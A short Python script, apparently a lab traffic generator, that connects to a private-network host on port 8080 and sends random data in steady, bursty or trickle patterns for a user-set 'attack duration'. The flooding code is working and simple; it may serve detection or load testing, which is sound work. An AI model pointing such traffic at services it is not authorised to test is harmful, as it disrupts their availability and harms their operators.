import socket
import time
import os
import sys

TARGET_IP = "192.168.4.238"
TARGET_PORT = 8080
BUFFER_SIZE = 1024 * 16

def run_injector(duration, mode):
    payload = os.urandom(BUFFER_SIZE)
    print(f"[*] {mode} -> {TARGET_IP}:{TARGET_PORT} ({duration}s)")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((TARGET_IP, TARGET_PORT))
    print("[+] Connected")

    end_t = time.time() + duration

    if mode == "bursty":
        while time.time() < end_t:
            # 3s ON
            on_end = min(time.time() + 3.0, end_t)
            while time.time() < on_end:
                sock.sendall(payload)
                time.sleep(0.005)

            # 2s OFF 
            remaining = end_t - time.time()
            if remaining <= 0:
                break
            time.sleep(min(2.0, remaining))

    elif mode == "trickle":
        small_payload = os.urandom(1024) 
        while time.time() < end_t:
            sock.sendall(small_payload)
            time.sleep(0.5)  

    else:  # steady
        while time.time() < end_t:
            sock.sendall(payload)
            time.sleep(0.005)

    sock.close()
    print("[OK] done")

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        dur = int(sys.argv[1])
        mode = sys.argv[2].lower() if len(sys.argv) >= 3 else "steady"
    else:
        dur = int(input("Attack duration (sec): "))
        mode = input("Mode (steady/bursty/trickle): ").strip().lower()

    run_injector(dur, mode)
